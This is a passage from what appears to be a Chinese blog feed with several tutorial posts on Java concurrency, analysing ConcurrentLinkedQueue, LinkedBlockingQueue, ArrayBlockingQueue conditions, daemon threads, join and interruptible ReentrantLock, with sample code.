<p>代码d：这是完成更新的最后一步了，就是更新tail的指向，最有意思的协调在这儿又有了体现。从代码看casTail(t, n)不管是否成功都会接着返回true标志着更新的成功。首先如果成功则表明本线程完成了两步的更新，返回true是理所当然的；如果casTail(t,n)不成功呢？要清楚的是完成代码c则代表着更新进入了中间态，代码d不成功则是tail的指向被其他线程改变。意味着对于其他的线程而言：它们得到的是中间态的更新，s!&#x3D;null，进入代码e帮助本线程执行最后一步并且先于本线程成功。这样本线程虽然代码d失败了，但是是由于别的线程的协助先完成了，所以返回true也就理所当然了。</p>
<p>通过分析这个入队的操作，可以清晰的看到无锁实现的每个步骤和状态下多线程之间的协调和工作。理解了入队的整个过程，出队的操作poll()的实现也就变得简单了。基本上是大同小异的，无非就是同时牵涉到了head和tail的状态，在改变head的同时照顾到tail的协调，在此不多赘述。下面介绍一下其无锁下的查看访问，其内部不单单是查看更包含了线程间的协调，这是无锁实现的一个特点。不管是contains()，size()还是isEmpty()，只要获得了head后面第一个最新的Node就可以很轻松的实现，毕竟Node的getNext()和getItem()返回的都是对应的最新值。所以先看看这些方法内部的first()如何获得最新的第一个Node：</p>
<pre><code>    Node&lt; e&gt; first() &#123;
        for (;;) &#123;
            Node&lt; e&gt; h = head;
            Node&lt; e&gt; t = tail;
            Node&lt; e&gt; first = h.getNext();
            if (h == head) &#123; //---------------------------------------a
                if (h == t) &#123; //-----------------------------------------b
                    if (first == null) //----------------------------------c
                        return null;
                    else
                        casTail(t, first); //--------------------------------d
                &#125; else &#123;
                    if (first.getItem() != null) //------------------------e
                        return first;
                    else // remove deleted node and continue
                        casHead(h, first); //------------------------------f
                &#125;
            &#125;
        &#125;
    &#125;
</code></pre>
<p>此方法在尝试获得最新的第一个非head结点的时候，在不同的阶段同样在协调着head和tail的更新任务，让人感觉无锁的世界没有纯粹的工作，呵呵。</p>
<p>代码a：还是最上层的协调，head指向没改变的情况下才继续下面的操作。这时侯head只可能是静止的，因为poll()出队操作的步骤是反着的：首先更新head的指向进入中间态，然后更新原head的next的item为null。</p>
<p>代码b：之所以h&#x3D;&#x3D;t的情况独立于其他的情况(在出队poll()方法中同样)，主要是因为first!&#x3D;null时可能对应着某一个更新的中间态，而产生中间态的的必要条件就是代码b成立。如果h&#x3D;&#x3D;t则表示当前线程获得的首尾指针指向同一个结点，当然代码b执行之后可能其他线程会进行head或者tail的更新。</p>
<p>代码c：first&#x3D;&#x3D;null表明tail并没有进入更新的中间态而是处于静止状态，并且由于tail指向的是head的指向，所以返回null是唯一的选择。但是这美好的一切都是建立在代码b和代码c之间没有其他的线程更新tail。一旦有其他的线程执行了入队的操作并至少进入中间态的话，h&#x3D;&#x3D;t和first&#x3D;&#x3D;null都遗憾的成立，这就造成了取得幻象值，而实际上h.getNext()已经不再为null。个人认为代码c改成if((first<br>&#x3D; h.getNext()) &#x3D;&#x3D; null)更能提高命中率。</p>
<p>代码d：只要first!&#x3D;null(不管是本人修改的代码还是源码)本线程则去尝试协调其他的线程先完成tail的更新，等待循环再次获取最新的head和tail。</p>
<p>代码e：此处first一定不为null，tail更新与否不影响first的item的获取，但是head的更新会有影响。如果head正在被另一个线程更新并进入中间态，既是poll()内的else<br>if (casHead(h, first))<br>成功，但是并没有执行first.setItem(null)之前。此时代码e是满足的，返回的也是当前的first的，但是随后head全部更新成功则first的item为null。所以此处返回的first的item并不一定是item!&#x3D;null的结点，在使用此方法获得的结点的item时一定要再次的进行判断，这点在contains(…)等方法内都有体现。</p>
<p>代码f：如果first的item&#x3D;&#x3D;null，则更新head的指向。直观上看似乎多余，因为出队的操作是先更新head的指向再更新item为null的。但是另一个方法remove(…)则仅仅更新item的值而不改变head的指向，所以针对这样的多线程调用，代码f变得非常的必需了。</p>
<p>这样通过这两个方法的分析可以推及对ConcurrentLinkedQueue共享变量的其他操作的实现，这样的无锁的实现印象最深的就是要考虑线程间的协调。不像锁机制的实现虽然牺牲了一定的性能，但是至少操作这些非线程安全的共享变量时不用过多的考虑其他线程的操作。至此才算体会到无锁实现的复杂性，这或许就是有得必有失吧，呵呵。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之ReentrantLock多条件的使用</title>
    <url>/blog/plang/java/threadsafe/conditions/</url>
    <content><![CDATA[<p>ReentrantLock的代码段中如何实现线程等待（wait）和唤醒（nofity)呢？ReentrantLock的wait()和notify（）方法是不能用的，那是针对synchronized的。</p>
<p>JAVA的实现方案是用Condition解决，lock.newCondition()可以创建一个条件，一个lock可以创建多个条件，这也是ReentrantLock比synchronized强的地方之一。</p>
<p>Condition 的方法与 wait 、 notify 和 notifyAll 方法类似，分别命名为await 、 signal 和signalAll。当不满足条件时调用Condition的await()方法就可以使当前线程等待。</p>
<p>下面以JAVA自己的线程安全容器为例，介绍一下Condition的使用。</p>
<h2 id="java-util-concurrent-ArrayBlockingQueue"><a href="#java-util-concurrent-ArrayBlockingQueue" class="headerlink" title="java.util.concurrent.ArrayBlockingQueue"></a>java.util.concurrent.ArrayBlockingQueue</h2><pre><code>public class ArrayBlockingQueue&lt; e&gt; extends AbstractQueue&lt; e&gt; implements BlockingQueue&lt; e&gt;, java.io.Serializable &#123;
    ...
    /** Main lock guarding all access */
    private final ReentrantLock lock;

    /** Condition for waiting takes */
    private final Condition notEmpty;

    /** Condition for waiting puts */
    private final Condition notFull;

    ...
    public ArrayBlockingQueue(int capacity, boolean fair) &#123;
        if (capacity &lt;= 0)
            throw new IllegalArgumentException();
        this.items = (E[]) new Object[capacity];
        lock = new ReentrantLock(fair);
        notEmpty = lock.newCondition();
        notFull =  lock.newCondition();
    &#125;

    public void put(E e) throws InterruptedException &#123;
        if (e == null) throw new NullPointerException();
        final E[] items = this.items;
        final ReentrantLock lock = this.lock;
        lock.lockInterruptibly();
        try &#123;
            try &#123;
                while (count == items.length)
                    notFull.await();
            &#125; catch (InterruptedException ie) &#123;
                notFull.signal(); // propagate to non-interrupted thread
                throw ie;
            &#125;
            insert(e);
        &#125; finally &#123;
            lock.unlock();
        &#125;
    &#125;

    private void insert(E x) &#123;
        items[putIndex] = x;
        putIndex = inc(putIndex);
        ++count;
        notEmpty.signal();
    &#125;

    public E take() throws InterruptedException &#123;
        final ReentrantLock lock = this.lock;
        lock.lockInterruptibly();
        try &#123;
            try &#123;
                while (count == 0)
                    notEmpty.await();
            &#125; catch (InterruptedException ie) &#123;
                notEmpty.signal(); // propagate to non-interrupted thread
                throw ie;
            &#125;
            E x = extract();
            return x;
        &#125; finally &#123;
            lock.unlock();
        &#125;
    &#125;

    private E extract() &#123;
        final E[] items = this.items;
        E x = items[takeIndex];
        items[takeIndex] = null;
        takeIndex = inc(takeIndex);
        --count;
        notFull.signal();
        return x;
    &#125;
    ...
&#125;
</code></pre>
<p>这里notEmpty和notFull作为lock的两个条件，分别负责管理想要加入元素的线程和想要取出元素的线程的wait和notify，通过await()、signal()、signalAll()方法，有效的分离了不同职责的线程。</p>
<p>例如put()方法在元素个数达到最大限制时会使用notFull条件把试图继续插入元素的线程都扔到等待集中，而执行了take()方法时如果顺利进入extract()则会空出空间，这时notFull负责随机的通知被其扔到等待集中的线程执行插入元素的操作。这样的设计使得线程按照功能行为职责管理成为了现实。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之守护线程和JOIN方法</title>
    <url>/blog/plang/java/threadsafe/deamonjoin/</url>
    <content><![CDATA[<h2 id="守护线程"><a href="#守护线程" class="headerlink" title="守护线程"></a>守护线程</h2><p>守护线程是辅助线程，比如A线程中启动了线程B，并把B设置成守护，则A为主线程，如果主线程结束，守护它的线程不论做什么都会结束。</p>
<pre><code>public class DaemonSample &#123;
    public static void main(String[] args) throws Exception&#123;
        DaemonThread t = new DaemonThread();
        t.setDaemon(true);//this is set t thread as a daemon thread.
        t.start();
        Thread.sleep(2000);
        System.out.println(&quot;main thread exit.&quot;);
    &#125;
&#125;

class DaemonThread extends Thread &#123;
    @Override
    public void run() &#123;
        for(int i = 0; i &lt; 10; i++) &#123;
            try &#123;
                Thread.sleep(1000);
            &#125; catch (InterruptedException e) &#123;
                e.printStackTrace();
            &#125;
            System.out.println(&quot;i=&quot; + i);
        &#125;
    &#125;
&#125;
</code></pre>
<p>这个例子的结果是main主线程睡两秒之后说再见，而子线程则是在这两秒内计计数然后跟着一起说再见。当然它很不情愿，因为它想计10秒，但是没机会。把t.setDaemonThread(true)注释掉你会看到主线程说再见了，但是子线程快快乐乐的计完数说再见。这就是守护线程的作用，一切以非守护线程为主！</p>
<h2 id="join方法"><a href="#join方法" class="headerlink" title="join方法"></a>join方法</h2><p>在简单的多线程编程中，常常使用join方法来控制线程的执行顺序，也仅仅是一小部分的作用。它的内部实现是wait(0)直至被调用线程执行完毕，调用线程才被唤醒。</p>
<pre><code>public class JoinSample &#123;
    public static void main(String[] args) throws Exception&#123;
        Thread t = new Thread(new SubThread());
        t.start();
        t.join();
        System.out.println(&quot;The end of main thread...&quot;);
    &#125;
&#125;

class SubThread implements Runnable &#123;

    public void run() &#123;
        try &#123;
            Thread.sleep(2000);
        &#125; catch (InterruptedException e) &#123;
            e.printStackTrace();
        &#125;
        System.out.println(&quot;The end of sub thread...&quot;);
    &#125;
&#125;
</code></pre>
<p>在这个例子中，被调用join()的线程是t，而调用线程则是main所以会先打印下面的那句再打印上面的，即使t要先睡两秒，main也得等着。把t.join()注释掉，main就可以扬眉吐气了。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>LinkedBlockingQueue生产消费模型简单实现</title>
    <url>/blog/plang/java/threadsafe/lbqexample/</url>
    <content><![CDATA[<pre><code>import java.util.Scanner;
import java.util.concurrent.CountDownLatch;
import java.util.concurrent.ExecutorService;
import java.util.concurrent.Executors;
import java.util.concurrent.LinkedBlockingQueue;
import java.util.concurrent.TimeUnit;
import java.util.concurrent.atomic.AtomicLong;


public class ModelSample &#123;
    /** 线程池提交的任务数*/
    private final int taskNum = Runtime.getRuntime().availableProcessors() + 1;
    /** 用于多线程间存取产品的队列*/
    private final LinkedBlockingQueue&lt; String&gt; queue = new LinkedBlockingQueue&lt; String&gt;(16);
    /** 记录产量*/
    private final AtomicLong output = new AtomicLong(0);
    /** 记录销量*/
    private final AtomicLong sales = new AtomicLong(0);
    /** 简单的线程起步开关*/
    private final CountDownLatch latch = new CountDownLatch(1);
    /** 停产后是否售完队列内的产品的选项*/
    private final boolean clear;
    /** 用于提交任务的线程池*/
    private final ExecutorService pool;
    /** 简陋的命令发送器*/
    private Scanner scanner;

    public ModelSample(boolean clear) &#123;
        this.pool = Executors.newCachedThreadPool();
        this.clear = clear;
    &#125;

    /**
     * 提交生产和消费任务给线程池,并在准备完毕后等待终止命令
     */
    public void service() &#123;
        doService();
        waitCommand();
    &#125;
    
    /**
     * 提交生产和消费任务给线程池,并在准备完毕后同时执行
     */
    private void doService() &#123;
        for (int i = 0; i &lt; taskNum; i++) &#123;
            if (i == 0) &#123;
                pool.submit(new Worker(queue, output, latch));
            &#125;
            else &#123;
                pool.submit(new Seller(queue, sales, latch, clear));
            &#125;
        &#125;
        latch.countDown();//开闸放狗,线程池内的线程正式开始工作
    &#125;

    /**
     * 接收来自终端输入的终止命令
     */
    private void waitCommand() &#123;
        scanner = new Scanner(System.in);
        while (!scanner.nextLine().equals(&quot;q&quot;)) &#123;
            try &#123;
                Thread.sleep(500);
            &#125;
            catch (InterruptedException e) &#123;
                e.printStackTrace();
            &#125;
        &#125;
        scanner.close();
        destory();
    &#125;

    /**
     * 停止一切生产和销售的线程
     */
    private void destory() &#123;
        pool.shutdownNow(); //不再接受新任务,同时试图中断池内正在执行的任务
        while (clear &amp;&amp; queue.size() &gt; 0) &#123;
            try &#123;
                Thread.sleep(500);
            &#125;
            catch (InterruptedException e) &#123;
                e.printStackTrace();
            &#125;
        &#125;
        System.out.println(&quot;Products:&quot; + output.get() + &quot;; Sales:&quot; + sales.get());
    &#125;

    public static void main(String[] args) &#123;
        ModelSample model = new ModelSample(false);
        model.service();
    &#125;
&#125;

/**
 * 生产者
 */
class Worker implements Runnable &#123;

    /** 假想的产品*/
    private static final String PRODUCT = &quot;Thinkpad&quot;;
    private final LinkedBlockingQueue&lt; string&gt; queue;
    private final CountDownLatch latch;
    private final AtomicLong output;

    public Worker(LinkedBlockingQueue&lt; String&gt; queue, AtomicLong output,CountDownLatch latch) &#123;
        this.output = output;
        this.queue = queue;
        this.latch = latch;
    &#125;

    public void run() &#123;
        try &#123;
            latch.await(); // 放闸之前老实的等待着
            for (;;) &#123;
                doWork();
                Thread.sleep(100);
            &#125;
        &#125;
        catch (InterruptedException e) &#123;
            System.out.println(&quot;Worker thread will be interrupted...&quot;);
        &#125;
    &#125;

    private void doWork() throws InterruptedException &#123;
        boolean success = queue.offer(PRODUCT, 100, TimeUnit.MILLISECONDS);
        if (success) &#123;
            output.incrementAndGet(); // 可以声明long型的参数获得返回值,作为日志的参数
            // 可以在此处生成记录日志
        &#125;
    &#125;
&#125;

/**
 * 消费者
 */
class Seller implements Runnable &#123;

    private final LinkedBlockingQueue&lt; String&gt; queue;
    private final AtomicLong sales;
    private final CountDownLatch latch;
    private final boolean clear;

    public Seller(LinkedBlockingQueue&lt; String&gt; queue, AtomicLong sales, CountDownLatch latch, boolean clear) &#123;
        this.queue = queue;
        this.sales = sales;
        this.latch = latch;
        this.clear = clear;
    &#125;

    public void run() &#123;
        try &#123;
            latch.await(); // 放闸之前老实的等待着
            for (;;) &#123;
                sale();
                Thread.sleep(500);
            &#125;
        &#125;
        catch (InterruptedException e) &#123;
            if(clear) &#123; // 响应中断请求后,如果有要求则销售完队列的产品后再终止线程
                cleanWarehouse();
            &#125;
            else &#123;
                System.out.println(&quot;Seller Thread will be interrupted...&quot;);
            &#125;
        &#125;
    &#125;

    private void sale() throws InterruptedException &#123;
        String item = queue.poll(50, TimeUnit.MILLISECONDS);
        if (item != null) &#123;
            sales.incrementAndGet(); // 可以声明long型的参数获得返回值,作为日志的参数
            // 可以在此处生成记录日志
        &#125;
    &#125;

    /**
     * 销售完队列剩余的产品
     */
    private void cleanWarehouse() &#123;
        try &#123;
            while (queue.size() &gt; 0) &#123;
                sale();
            &#125;
        &#125;
        catch (InterruptedException ex) &#123;
            System.out.println(&quot;Seller Thread will be interrupted...&quot;);
        &#125;
    &#125;
&#125;
</code></pre>
<p>ModelSample是主控，负责生产消费的调度，Worker和Seller分别作为生产者和消费者，并均实现Runnable接口。ModelSample构造器内的参数clear主要是用于：当主控调用线程池的shutdownNow()方法时，会给池内的所有线程发送中断信号，使得线程的中断标志置位。这时候对应的Runnable的run()方法使用响应中断的LinkedBlockingQueue的方法(入队，出队)时就会抛出InterruptedException异常，生产者线程对这个异常的处理是记录信息后终止任务。而消费者线程是记录信息后终止任务，还是消费完队列内的产品再终止任务，则取决于这个选项值。</p>
<p>多线程的一个难点在于适当得销毁线程，这里得益于LinkedBlockingQueue的入队和出队的操作均提供响应中断的API，使得控制起来相对的简单一点。在Worker和Seller中共享LinkedBlockingQueue的实例queue时，我没有使用put或者take在queue满和空状态时无限制的阻塞线程，而是使用offer(E<br>e, long timeout, TimeUnit unit)和poll(long timeout, TimeUnit<br>unit)在指定的timeout时间内满足条件时阻塞线程。主要因为在于：先中断生产线程的情况下，如果所有的消费线程之前均被扔到等待集，那么无法它们将被唤醒。而后两者在超时后将自行恢复可运行状态。</p>
<p>再者看看queue的size()方法，这也是选择LinkedBlockingQueue而不选ArrayBlockingQueue作为阻塞队列的原因。因为前者使用的AtomicInteger的count.get()返回最新值，完全无锁；而后者则需要获取唯一的锁，在此期间无法进行任何出队，入队操作。而这个例子中clear&#x3D;&#x3D;true时，主线程和所有的消费线程均需要使用size()方法检查queue的元素个数。这类的非业务操作本就不该影响别的操作，所以这里LinkedBlockingQueue使用AtomicInteger计数无疑是个优秀的设计。</p>
<p>另外编写这个例子时有点玩票的用了CountDownLatch，它的作用很简单。countDown()方法内部计数不为0时，执行了其await()方法的线程将会阻塞等待；一旦计数为0，这些线程将恢复可运行状态继续执行。这里用它就像一个发令枪，线程池submit任务的新线程在run内被阻塞，主线程一声令下countDown！这些生产消费线程均恢复执行状态。最后就是命令的实现过于简陋了，如果要响应其他的命令的话可以改造成响应事件处理的观察者模式，不过它不是演示的重点就从简了。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之LinkedBlockingQueue</title>
    <url>/blog/plang/java/threadsafe/linkedblockingqueue/</url>
    <content><![CDATA[<p>队列这个数据结构已经很熟悉了，利用其先进先出的特性，多数生产消费模型的首选数据结构就是队列。对于有多个生产者和多个消费者线程的模型来说，最重要是他们共同访问的Queue是线程安全的。JDK中提供的线程安全的Queue的实现还是很丰富的：</p>
<p>ArrayBlockingQueue,LinkedBlockingQueue,PriorityBlockingQueue,DelayQueue,ConcurrentLinkedQueue等等，多数情况下使用这些数据结构编写并发程序足够了。</p>
<p>这里分析一下LinkedBlockingQueue的实现。</p>
<p>首先从简单的开始，先看看LinkedBlockingQueue线程安全的实现。之所以介绍它是因为其实现比较典型，对比ArrayBlokcingQueue使用一个ReentrantLock和两个Condition维护内部的数组来说，它使用了两个ReentrantLock，并且分别对应一个Condition来实现对内部数据结构Node型变量的维护。</p>
<pre><code>public class LinkedBlockingQueue&lt; e&gt; extends AbstractQueue&lt; e&gt;
        implements BlockingQueue&lt; e&gt;, java.io.Serializable &#123;
    private static final long serialVersionUID = -6903933977591709194L;

    /**
     * 节点数据结构
     */
    static class Node&lt; e&gt; &#123;
        /** The item, volatile to ensure barrier separating write and read */
        volatile E item;
        Node&lt; e&gt; next;
        Node(E x) &#123; item = x; &#125;
    &#125;

    /** 队列的容量 */
    private final int capacity;

    /** 持有节点计数器 */
    private final AtomicInteger count = new AtomicInteger(0);

    /** 头指针 */
    private transient Node&lt; e&gt; head;

    /** 尾指针 */
    private transient Node&lt; e&gt; last;

    /** 用于读取的独占锁*/
    private final ReentrantLock takeLock = new ReentrantLock();

    /** 队列是否为空的条件 */
    private final Condition notEmpty = takeLock.newCondition();

    /** 用于写入的独占锁 */
    private final ReentrantLock putLock = new ReentrantLock();

    /** 队列是否已满的条件 */
    private final Condition notFull = putLock.newCondition();

    private void signalNotEmpty() &#123;
        final ReentrantLock takeLock = this.takeLock;
        takeLock.lock();
        try &#123;
            notEmpty.signal();
        &#125; finally &#123;
            takeLock.unlock();
        &#125;
    &#125;

    private void signalNotFull() &#123;
        final ReentrantLock putLock = this.putLock;
        putLock.lock();
        try &#123;
            notFull.signal();
        &#125; finally &#123;
            putLock.unlock();
        &#125;
    &#125;

    private void insert(E x) &#123;
        last = last.next = new Node&lt; e&gt;(x);
    &#125;

    private E extract() &#123;
        Node&lt; e&gt; first = head.next;
        head = first;
        E x = first.item;
        first.item = null;
        return x;
    &#125;

    private void fullyLock() &#123;
        putLock.lock();
        takeLock.lock();
    &#125;

    private void fullyUnlock() &#123;
        takeLock.unlock();
        putLock.unlock();
    &#125;

    public LinkedBlockingQueue(int capacity) &#123;
        if (capacity &lt;= 0) throw new IllegalArgumentException();
        this.capacity = capacity;
        last = head = new Node&lt; e&gt;(null);
    &#125;
   ...
&#125;
</code></pre>
<p>这里仅仅展示部分源码，主要的方法在后面的分析中列出。分析之前明确一个最基本的概念。天天念叨着编写线程安全的类，什么是线程安全的类？那就是类内共享的全局变量的访问必须保证是不受多线程形式影响的。如果由于多线程的访问（改变，遍历，查看）而使这些变量结构被破坏或者针对这些变量操作的原子性被破坏，则这个类的编写不是线程安全的。</p>
<p>明确了这个基本的概念就可以很好的理解这个Queue的实现为什么是线程安全的了。在LinkedBlockingQueue的所有共享的全局变量中，final声明的capacity在构造器生成实例时就成了不变量了。而final声明的count由于是AtomicInteger类型的，所以能够保证其操作的原子性。剩下的final的变量都是初始化成了不变量，并且不包含可变属性，所以都是访问安全的。那么剩下的就是Node类型的head和last两个可变量。所以要保证LinkedBlockingQueue是线程安全的就是要保证对head和last的访问是线程安全的。</p>
<p>首先从上面的源码可以看到insert(E x),extract()是真正的操作head,last来入队和出对的方法，但是由于是私有的，所以不能被直接访问，不用担心线程的问题。实际入队的公开的方法是put(E e)，offer(E e)和offer(E e, long timeout, TimeUnit unit)。put(…)方法与offer(…)都是把新元素加入到队尾，所不同的是如果不满足条件put会把当前执行的线程扔到等待集中等待被唤醒继续执行，而offer则是直接退出，所以如果是需要使用它的阻塞特性的话，不能直接使用poll(…)。</p>
<p>put(…)方法中加入元素的操作使用this.putLock来限制多线程的访问，并且使用了可中断的方式：</p>
<pre><code>public void put(E e) throws InterruptedException &#123;
        if (e == null) throw new NullPointerException();
        int c = -1;
        final ReentrantLock putLock = this.putLock;
        final AtomicInteger count = this.count; //----------------a
        putLock.lockInterruptibly();//随时保证响应中断 //--------b
        try &#123;
            //*****************************(1)*********************************
            try &#123;
                while (count.get() == capacity)
                    notFull.await();
            &#125; catch (InterruptedException ie) &#123;
                notFull.signal(); // propagate to a non-interrupted thread
                throw ie;
            &#125;
           //*****************************end*********************************
            insert(e);//真正的入队操作
           //********************(2)**********************
            c = count.getAndIncrement();
            if (c + 1 &lt; capacity)
                notFull.signal();
            //******************end**********************
        &#125; finally &#123;
            putLock.unlock();
        &#125; //-------------------------c
        if (c == 0) //---------------d
            signalNotEmpty();
&#125;
</code></pre>
<p>代码段(1)是阻塞操作，代码段(2)是count递增和唤醒等待的操作。两者之间的insert(e)才是入队操作，其实际是操作的队尾引用last，并且没有牵涉到head。所以设计两个锁的原因就在这里！因为出队操作take()，poll()实际是执行extract()仅仅操作队首引用head。增加了this.takeLock这个锁，就实现了多个不同任务的线程入队的同时可以进行出对的操作，并且由于两个操作所共同使用的count是AtomicInteger类型的，所以完全不用考虑计数器递增递减的问题。假设count换成int，则相应的putLock内的count++和takeLock内的count–有可能相互覆盖，最终造成count的值被腐蚀，故这种设计必须使用原子操作类。</p>
<p>保证类的线程安全只要保证head和last的操作的线程安全，也就是保证insert(E x)和extract()线程安全即可。那么上面的put方法中的代码段(1)放在a,b之间，代码段(2)放在c,d之间不是更好？毕竟锁的粒度越小越好。单纯的考虑count的话这样的改变是正确的，但是await()和singal()这两个方法执行时都会检查当前线程是否是独占锁的那个线程，如果不是则抛出java.lang.IllegalMonitorStateException异常。而这两段代码中包含notFull.await()和notFull.signal()这两句使得(1),(2)必须放在lock保护块内。这里说明主要是count本身并不需要putLock或者takeLock的保护，从</p>
<pre><code>public int size() &#123;
        return count.get();
&#125;
</code></pre>
<p>可以看出count的访问是不需要任何锁的。而在put等方法中，其与锁机制的混用很容易造成迷惑。最后put中的代码d的作用主要是一个低位及时通知的作用，也就是队列刚有值试图获得takeLock去通知等待集中的出队线程。因为c&#x3D;&#x3D;0意味着count.getAndIncrement()原子递增成功，所以count &gt; 0成立。类似作用的代码：</p>
<pre><code>if (c == capacity)
       signalNotFull();
</code></pre>
<p>在take和poll中也有出现，实现了高位及时通知。</p>
<p>分析完了put，对应的offer，take，poll方法都是类似的实现。下面看看遍历队列的操作：</p>
<pre><code>public Object[] toArray() &#123;
        fullyLock();
        try &#123;
            int size = count.get();
            Object[] a = new Object[size];
            int k = 0;
            for (Node p = head.next; p != null; p = p.next)
                a[k++] = p.item;
            return a;
        &#125; finally &#123;
            fullyUnlock();
        &#125;
&#125;
</code></pre>
<p>这个方法很简单主要是要清楚一点：这个操作执行时不允许其他线程再修改队首和队尾，所以使用了fullyLock去获取putLock和takeLock，只要成功则可以保证不会再有修改队列的操作。然后就是安心的遍历到最后一个元素为止了。</p>
<p>另外在offer(E e, long timeout, TimeUnit unit)这个方法中提供了带有超时的入队操作，如果一直不成功的话，它会尝试在timeout的时间内入队：</p>
<pre><code>for (;;) &#123;
     ...//入队操作
     if (nanos &lt;= 0)
         return false;
     try &#123;
          nanos = notFull.awaitNanos(nanos);
     &#125; catch (InterruptedException ie) &#123;
           notFull.signal(); // propagate to a non-interrupted thread
           throw ie;
     &#125;
&#125;
</code></pre>
<p>其内部循环使用notFull.awaitNanos(nanos)方法反复的计算剩余时间的大概值用于实现延时功能。nanos&lt;&#x3D;0则放弃尝试，直接退出。</p>
<p>整体而言，LinkedBlockingQueue的实现还是很清晰的。相对于后面要介绍的ConcurrentLinkedQueue来说，它属于简单的实现。这些看似复杂的数据结构的实现实质都是多线程的基础的综合应用。就好像数学中千变万化的难题其实都是基础公式的组合一样，如果有清晰的基础认知，还是能找到自己分析的思路的。本来是想从mina中找找类似的实现，不过很遗憾的是它好像仅仅实现了一个非线程安全的循环队列，然后在其基础上使用synchronized进行封装成线程安全的Queue。</p>
]]></content>
      <categories>
        <category>编程语言</category>
        <category>JAVA</category>
        <category>线程安全</category>
      </categories>
      <tags>
        <tag>JAVA</tag>
        <tag>线程安全</tag>
      </tags>
  </entry>
  <entry>
    <title>JAVA同步之ReentrantLock可中断锁的使用</title>
    <url>/blog/plang/java/threadsafe/lockInterruptibly/</url>
    <content><![CDATA[<p>本本文是对ReentrantLock可中断锁的介绍。可中断锁是通过ReentrantLock提供的lockInterruptibly()方法实现的。</p>
<h2 id="响应中断是什么意思"><a href="#响应中断是什么意思" class="headerlink" title="响应中断是什么意思?"></a>响应中断是什么意思?</h2><p>比如A、B两线程去竞争锁，A得到了锁，B等待，但是A有很多事情要处理，所以一直不返回。B可能就会等不及了，想中断自己，不再等待这个锁了，转而处理其他事情。在这种情况下，synchronized的做法是，B线程中断自己（或者别的线程中断它），我不去响应，继续让B线程等待，你再怎么中断，我全当耳边风。而lockInterruptibly()的做法是，B线程中断自己（或者别的线程中断它），ReentrantLock响应这个中断，不再让B等待这个锁的到来。有了这个机制，使用ReentrantLock时死锁了线程可以中断自己来解除死锁。</p>
<h2 id="什么叫做中断自己？"><a href="#什么叫做中断自己？" class="headerlink" title="什么叫做中断自己？"></a>什么叫做中断自己？</h2><p>比如A、B两线程去竞争锁，它们肯定是被父线程创建并启动的，那父线程一定有它们的引用。线程都有interrupt()方法，假设父线程创建的线程B的引用是b，那b.interrupt()就是中断自己。</p>
<h2 id="怎么中断自己"><a href="#怎么中断自己" class="headerlink" title="怎么中断自己"></a>怎么中断自己</h2><p>lock.lockInterruptibly()，这个方法会抛出异常InterruptedException。</p>
<p>什么时候抛出异常呢？当调用interrupt()方法自我中断的时候。</p>
<p>这时线程就进入了中断处理的过程，不会再等待锁了。</p>
<p>至于异常处理是怎样的，有很多种选择呀。比如可以退出线程的run()方法使线程完结，也可以使线程处理另外的事情。</p>
<h2 id="一个中断锁的例子"><a href="#一个中断锁的例子" class="headerlink" title="一个中断锁的例子"></a>一个中断锁的例子</h2><pre><code>import java.util.concurrent.locks.ReentrantLock;

public class ReentrantLockSample &#123;

    public static void main(String[] args) &#123;
        testSynchronized();
        testReentrantLock();
    &#125;

    public static void testReentrantLock() &#123;
        final SampleSupport1 support = new SampleSupport1();
        Thread first = new Thread(new Runnable() &#123;
            public void run() &#123;
                try &#123;
                    support.doSomething();
                &#125;
                catch (InterruptedException e) &#123;
                    e.printStackTrace();
                &#125;
            &#125;
        &#125;,&quot;first&quot;);

        Thread second = new Thread(new Runnable() &#123;
            public void run() &#123;
                try &#123;
                    support.doSomething();
                &#125;
                catch (InterruptedException e) &#123;
                    System.out.println(&quot;Second Thread Interrupted without executing counter++,beacuse it waits a long time.&quot;);
                &#125;
            &#125;
        &#125;,&quot;second&quot;);

        executeTest(first, second);
    &#125;

    public static void testSynchronized() &#123;
        final SampleSupport2 support2 = new SampleSupport2();

        Runnable runnable = new Runnable() &#123;
            public void run() &#123;
                support2.doSomething();
            &#125;
        &#125;;

        Thread third = new Thread(runnable,&quot;third&quot;);
        Thread fourth = new Thread(runnable,&quot;fourth&quot;);

        executeTest(third, fourth);
    &#125;

    /**
     * Make thread a run faster than thread b,
     * then thread b will be interruted after about 1s.
     * @param a
     * @param b
     */
    public static void executeTest(Thread a, Thread b) &#123;
        a.start();
        try &#123;
            Thread.sleep(100);
            b.start(); 
            Thread.sleep(1000);
            b.interrupt(); 
        &#125;
        catch (InterruptedException e) &#123;
            e.printStackTrace();
        &#125;
    &#125;
&#125;

abstract class SampleSupport &#123;

    protected int counter;

    /**
     * A simple countdown,it will stop after about 5s. 
     */
    public void startTheCountdown() &#123;
        long currentTime = System.currentTimeMillis();
        for (;;) &#123;
            long diff = System.currentTimeMillis() - currentTime;
            if (diff &gt; 5000) &#123;
                break;
            &#125;
        &#125;
    &#125;
&#125;

class SampleSupport1 extends SampleSupport &#123;

    private final ReentrantLock lock = new ReentrantLock();

    public void doSomething() throws InterruptedException &#123;
        lock.lockInterruptibly();
//        try &#123;
//            lock.lockInterruptibly();
//        &#125; catch (InterruptedException e) &#123;
//            //做一些其它的事，不结束线程
//        &#125;
        System.out.println(Thread.currentThread().getName() + &quot; will execute counter++.&quot;);
        startTheCountdown();
        try &#123;
            counter++;
        &#125;
        finally &#123;
            lock.unlock();
        &#125;
    &#125;
&#125;

class SampleSupport2 extends SampleSupport &#123;

    public synchronized void doSomething() &#123;
        System.out.println(Thread.currentThread().getName() + &quot; will execute counter++.&quot;);
        startTheCountdown();
        counter++;
    &#125;
&#125;
</code></pre>
